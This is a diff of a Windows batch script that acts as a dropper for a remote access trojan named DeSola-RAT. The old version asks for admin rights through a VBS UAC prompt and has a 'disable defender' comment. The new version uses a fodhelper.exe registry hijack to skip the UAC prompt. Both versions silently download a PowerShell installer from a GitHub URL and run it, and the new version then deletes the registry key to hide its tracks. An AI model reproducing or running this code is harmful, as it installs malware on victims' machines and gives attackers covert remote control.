@@ -1,35 +1,15 @@
-@REM get admin permissions for script
 @echo off
-:: BatchGotAdmin
-:-------------------------------------
-@REM  --> check for permissions
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-)
+setlocal enabledelayedexpansion
 
-@REM --> if error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
+:: UAC Bypass via fodhelper.exe (no prompt)
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/installer.ps1')\"" /f >nul 2>&1
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1
 
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+:: Trigger fodhelper
+fodhelper.exe >nul 2>&1
 
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
+:: Clean registry
+reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-
-@REM disable defender
-
-@REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/installer.ps1 -Outfile installer.ps1"
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+:: Exit silently
+exit /b
